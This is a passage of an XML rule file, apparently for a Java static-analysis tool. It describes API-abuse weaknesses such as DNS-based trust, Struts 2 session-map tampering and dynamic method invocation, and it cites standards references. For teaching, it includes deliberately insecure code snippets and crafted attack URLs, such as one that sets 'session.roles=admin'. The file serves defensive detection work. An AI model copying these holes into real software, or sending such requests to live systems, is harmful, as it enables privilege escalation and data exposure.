																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP2060.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 676</em> <br></p>
																									   <p>[7] OWASP <em>ESAPI Secure Coding Guideline</em> <br></p>
																									   <p>[8] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Risky Resource Management - CWE ID 676</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_often_misused_authentication</key>
		<internalKey>API Abuse/Often Misused/Authentication</internalKey>
		<name>Often Misused: Authentication</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Attackers can spoof DNS entries. Do not rely on DNS names for security.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Many DNS servers are susceptible to spoofing attacks, so you should assume that your software will someday run in an environment with a compromised DNS server. If attackers are allowed to make DNS updates (sometimes called DNS cache poisoning), they can route your network traffic through their machines or make it appear as if their IP addresses are part of your domain. Do not base the security of your system on DNS names.<br><br><br><b>Example:</b> The following code uses a DNS lookup to determine whether an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status.<br><br><pre><br> String ip = request.getRemoteAddr();<br> InetAddress addr = InetAddress.getByName(ip);<br> if (addr.getCanonicalHostName().endsWith("trustme.com")) {<br> trusted = true;<br> }<br></pre><br><br>IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3460 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3460 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3460 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3460 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3460 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 247, CWE ID 292, CWE ID 558, CWE ID 807</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 807</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 807</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_often_misused_boolean_getboolean_</key>
		<internalKey>API Abuse/Often Misused/Boolean.getBoolean()
		</internalKey>
		<name>Often Misused: Boolean.getBoolean()</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The method <code>Boolean.getBoolean()</code> is often confused with <code>Boolean.valueOf()</code> or <code>Boolean.parseBoolean()</code> method calls.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  In most cases, a call to <code>Boolean.getBoolean()</code> is often misused as it is assumed to return the boolean value represented by the specified string argument.  However, as stated in the Javadoc <code>Boolean.getBoolean(String)</code> method "Returns true if and only if the system property named by the argument exists and is equal to the string 'true'."<br><br>Most often what the developer intended to use was a call to <code>Boolean.valueOf(String)</code> or <code>Boolean.parseBoolean(String)</code> method.<br><b>Example 1:</b> The following code will not behave as expected. It will print "FALSE" as <code>Boolean.getBoolean(String)</code> does not translate a String primitive. It only translates system property.<br><pre><br> ...<br> String isValid = "true";<br> if ( Boolean.getBoolean(isValid) ) {<br>     System.out.println("TRUE");<br> }<br> else {<br>     System.out.println("FALSE");<br> }<br> ...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em>Class Boolean</em> Oracle<br></p>
																									   <p>[2] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_often_misused_encoding</key>
		<internalKey>API Abuse/Often Misused/Encoding</internalKey>
		<name>Often Misused: Encoding</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is easy to believe that this encoding method will protect against injection attacks, but if the method is not used in exactly the right context, it can offer much less protection than it advertises.<br><br>    <b>Example 1:</b> The following encoding call allows an attacker quite a bit of latitude for inserting malicious JavaScript:<br><pre><br>    out.println("x = " + encoder.encodeForJavaScript(input) + ";");<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 176</em> <br></p>
																									   <p>[2] OWASP <em>ESAPI Secure Coding Guideline</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_often_misused_spring_remote_service</key>
		<internalKey>API Abuse/Often Misused/Spring Remote Service
		</internalKey>
		<name>Often Misused: Spring Remote Service</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Remote services are configured in the Spring application.  By default, these remote services do not require authentication and information transferred to or from this service is in clear text.   This could allow an attacker to access privileged operations or expose sensitive data.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Spring provides an easy mechanism to turn any Spring managed bean into an object that is exposed externally via RMI, HTTP, Burlap, Hessian, and JMX protocols.  Any public method of the remoted Spring bean can be called externally and the data being passed between the client and the remoted objects are in clear text.  The major problem with these services is that they are open by default and provide no guarantees of confidentiality or integrity out of the box.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[3] Anirvan Chakraborty , Jessica Ditt , Aleksa Vukotic , Jan Machacek <em>ProSpring 2.5</em> <br></p>
																									   <p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1, Requirement 6.5.10</em> <br></p>
																									   <p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.4, Requirement 6.5.8</em> <br></p>
																									   <p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4, Requirement 6.5.8</em> <br></p>
																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4, Requirement 6.5.9</em> <br></p>
																									   <p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[9] Gary Mak , Daniel Rubio , Josh Long <em>Spring Recipes</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_often_misused_spring_web_service</key>
		<internalKey>API Abuse/Often Misused/Spring Web Service</internalKey>
		<name>Often Misused: Spring Web Service</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Web services are configured in the Spring application By default, these web services do not require authentication and information transferred to/from this service is in clear text.   This could allow an attacker to access privileged operations or expose sensitive data.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Spring provides an easy mechanism to turn any Spring managed bean into web services via Spring WS or XFire.  Any public method of the remoted Spring bean can be called externally and the data being passed between the client and the web service enabled objects are in clear text.  The major problem with these services is that they are open by default and provide no guarantees of confidentiality or integrity out of the box.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[3] Anirvan Chakraborty , Jessica Ditt , Aleksa Vukotic , Jan Machacek <em>ProSpring 2.5</em> <br></p>
																									   <p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1, Requirement 6.5.10</em> <br></p>
																									   <p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.4, Requirement 6.5.8</em> <br></p>
																									   <p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4, Requirement 6.5.8</em> <br></p>
																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4, Requirement 6.5.9</em> <br></p>
																									   <p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[9] Gary Mak , Daniel Rubio , Josh Long <em>Spring Recipes</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_password_management_weak_redundancy</key>
		<internalKey>API Abuse/Password Management/Weak Redundancy
		</internalKey>
		<name>Password Management: Weak Redundancy</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The password should be given twice instead of duplicated.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							   Duplicating the password is not the way this API should be used. The intent of this API is to make sure that the user does not mistype the password. Duplicating the password circumvents this safety mechanism.<br><br>    <b>Example 1:</b><br>    <pre><br>        String password=request.getParameter("password");<br>        ...<br>        DefaultUser user = (DefaultUser) ESAPI.authenticator().createUser(username, password, password);<br>    </pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 521</em> <br></p>
																									   <p>[2] OWASP <em>ESAPI Secure Coding API: User</em> <br></p>
																									   <p>[3] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_poor_style_explicit_call_to_finalize_</key>
		<internalKey>API Abuse/Poor Style/Explicit Call to finalize()
		</internalKey>
		<name>Poor Style: Explicit Call to finalize()</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The <code>finalize()</code> method should only be called by the JVM after the object has been garbage collected.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  While the Java Language Specification allows an object's <code>finalize()</code> method to be called from outside the finalizer, doing so is usually a bad idea. For example, calling <code>finalize()</code> explicitly means that <code>finalize()</code> will be called more than once: the first time will be the explicit call and the last time will be the call that is made after the object is garbage collected.<br><br><b>Example 1:</b>  The following code fragment calls <code>finalize()</code> explicitly:<br><br><pre><br>// time to clean up<br>widget.finalize();<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 586</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_struts_2_bad_practices_application_map_tampering</key>
		<internalKey>API Abuse/Struts 2 Bad Practices/Application Map
			Tampering
		</internalKey>
		<name>Struts 2 Bad Practices: Application Map Tampering</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A Struts 2.x Action implements a class which allows an attacker to modify the application business logic by binding arbitrary data into the session, application or request server side objects
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Apache Struts 2.x included the new Aware interfaces to allow developers to easily inject maps with relevant runtime information into their Actions code. These interfaces include: <code>org.apache.struts2.interceptor.ApplicationtAware</code>, <code>org.apache.struts2.interceptor.SessionAware</code> and <code>org.apache.struts2.interceptor.RequestAware</code>. In order to get any of these data maps injected into their Actions code, developers need to implement the setter specified in the interface (eg: <code>setSession</code> for <code>SessionAware</code> Interface):<br><code><br>public class VulnerableAction extends ActionSupport implements SessionAware {<br><br>  protected Map&lt;String, Object&gt; session;<br><br>  @Override<br>  public void setSession(Map&lt;String, Object&gt; session) {<br>    this.session = session;<br>  }<br></code><br>On the other hand, Struts 2.x automatically binds the request data coming from the user to the Action's properties through public accessors defined in the Action. As the Aware interfaces require the implementation of the public setter defined in the Aware interface, this setter will also be automatically bound to any request parameter that matches the Aware interface setter name which might allow remote attackers to modify run-time data values via a crafted parameter to an application that implements an affected interface, as demonstrated by the <code>SessionAware</code>, <code>RequestAware</code>, <code>ApplicationAware</code> interfaces.<br><br>The following URL will allow an attacker to overwrite the "roles" attribute in the session map, potentially allowing him to become administrator.<br><code><br>http://server/VulnerableAction?session.roles=admin<br></code><br><br>While these interfaces only require the implementation of the setter accessors, if the corresponding getter is also implemented, the changes to these map collections will be session-scoped persisted, rather than just affect the current request scope.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 20</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_struts_2_bad_practices_dynamic_method_invocation</key>
		<internalKey>API Abuse/Struts 2 Bad Practices/Dynamic Method
			Invocation
		</internalKey>
		<name>Struts 2 Bad Practices: Dynamic Method Invocation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  <Paragraph>The Struts 2 Action exposes a public method that can be invoked by end users overriding the Action's execute() method.</Paragraph>
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Struts 2 introduced a feature called "Dynamic Method Invocation" which allow an Action to expose methods other than execute(). The "!" (bang) character can be used in the Action URL to invoke any public method in the Action in "Dynamic Method Invocation" is enabled.  Developers that are not aware of this feature can inadvertently expose internal business logic to attackers.<br><br>  As an example, if the Action contains a public method called getUserPassword() that takes no arguments and fails to disable the "Dynamic Method Invocation" feature, an attacker will be able to take advantage of this visiting the following URL: <code>http://server/app/recoverpassword!getPassword.action</code><br><br>  
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 285</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authorization</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 862</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[22]  <em>Struts 2 Security Vulnerability - Dynamic Method Invocation</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_struts_2_bad_practices_request_map_tampering</key>
		<internalKey>API Abuse/Struts 2 Bad Practices/Request Map Tampering
		</internalKey>
		<name>Struts 2 Bad Practices: Request Map Tampering</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A Struts 2.x Action implements a class which allows an attacker to modify the application business logic by binding arbitrary data into the session, application or request server side objects
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Apache Struts 2.x included the new Aware interfaces to allow developers to easily inject maps with relevant runtime information into their Actions code. These interfaces include: <code>org.apache.struts2.interceptor.ApplicationtAware</code>, <code>org.apache.struts2.interceptor.SessionAware</code> and <code>org.apache.struts2.interceptor.RequestAware</code>. In order to get any of these data maps injected into their Actions code, developers need to implement the setter specified in the interface (eg: <code>setSession</code> for <code>SessionAware</code> Interface):<br><code><br>public class VulnerableAction extends ActionSupport implements SessionAware {<br><br>  protected Map&lt;String, Object&gt; session;<br><br>  @Override<br>  public void setSession(Map&lt;String, Object&gt; session) {<br>    this.session = session;<br>  }<br></code><br>On the other hand, Struts 2.x automatically binds the request data coming from the user to the Action's properties through public accessors defined in the Action. As the Aware interfaces require the implementation of the public setter defined in the Aware interface, this setter will also be automatically bound to any request parameter that matches the Aware interface setter name which might allow remote attackers to modify run-time data values via a crafted parameter to an application that implements an affected interface, as demonstrated by the <code>SessionAware</code>, <code>RequestAware</code>, <code>ApplicationAware</code> interfaces.<br><br>The following URL will allow an attacker to overwrite the "roles" attribute in the session map, potentially allowing him to become administrator.<br><code><br>http://server/VulnerableAction?session.roles=admin<br></code><br><br>While these interfaces only require the implementation of the setter accessors, if the corresponding getter is also implemented, the changes to these map collections will be session-scoped persisted, rather than just affect the current request scope.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 20</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_struts_2_bad_practices_session_map_tampering</key>
		<internalKey>API Abuse/Struts 2 Bad Practices/Session Map Tampering
		</internalKey>
		<name>Struts 2 Bad Practices: Session Map Tampering</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A Struts 2.x Action implements a class which allows an attacker to modify the application business logic by binding arbitrary data into the session, application or request server side objects
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Apache Struts 2.x included the new Aware interfaces to allow developers to easily inject maps with relevant runtime information into their Actions code. These interfaces include: <code>org.apache.struts2.interceptor.ApplicationtAware</code>, <code>org.apache.struts2.interceptor.SessionAware</code> and <code>org.apache.struts2.interceptor.RequestAware</code>. In order to get any of these data maps injected into their Actions code, developers need to implement the setter specified in the interface (eg: <code>setSession</code> for <code>SessionAware</code> Interface):<br><code><br>public class VulnerableAction extends ActionSupport implements SessionAware {<br><br>  protected Map&lt;String, Object&gt; session;<br><br>  @Override<br>  public void setSession(Map&lt;String, Object&gt; session) {<br>    this.session = session;<br>  }<br></code><br>On the other hand, Struts 2.x automatically binds the request data coming from the user to the Action's properties through public accessors defined in the Action. As the Aware interfaces require the implementation of the public setter defined in the Aware interface, this setter will also be automatically bound to any request parameter that matches the Aware interface setter name which might allow remote attackers to modify run-time data values via a crafted parameter to an application that implements an affected interface, as demonstrated by the <code>SessionAware</code>, <code>RequestAware</code>, <code>ApplicationAware</code> interfaces.<br><br>The following URL will allow an attacker to overwrite the "roles" attribute in the session map, potentially allowing him to become administrator.<br><code><br>http://server/VulnerableAction?session.roles=admin<br></code><br><br>While these interfaces only require the implementation of the setter accessors, if the corresponding getter is also implemented, the changes to these map collections will be session-scoped persisted, rather than just affect the current request scope.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 20</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_unchecked_return_value</key>
		<internalKey>API Abuse/Unchecked Return Value</internalKey>
		<name>Unchecked Return Value</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Ignoring a method's return value can cause the program to overlook unexpected states and conditions.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is not uncommon for Java programmers to misunderstand <code>read()</code> and related methods that are part of many <code>java.io</code> classes. Most errors and unusual events in Java result in an exception being thrown. (This is one of the advantages that Java has over languages like C: Exceptions make it easier for programmers to think about what can go wrong.) But the stream and reader classes do not consider it unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested.<br><br>This behavior makes it important for programmers to examine the return value from <code>read()</code> and other IO methods to ensure that they receive the amount of data they expect.<br><br><br><br><b>Example:</b> The following code loops through a set of users, reading a private data file for each user. The programmer assumes that the files are always exactly 1 kilobyte in size and therefore ignores the return value from <code>read()</code>. If an attacker can create a smaller file, the program will recycle the remainder of the data from the previous user and handle it as though it belongs to the attacker.<br><br><pre><br>FileInputStream fis;<br>byte[] byteArray = new byte[1024];<br>for (Iterator i=users.iterator(); i.hasNext();) {<br>    String userName = (String) i.next();<br>    String pFileName = PFILE_ROOT + "/" + userName;<br>    FileInputStream fis = new FileInputStream(pFileName);<br>    fis.read(byteArray); // the file is always 1k bytes<br>    fis.close();<br>    processPFile(userName, byteArray);<br>}<br></pre>
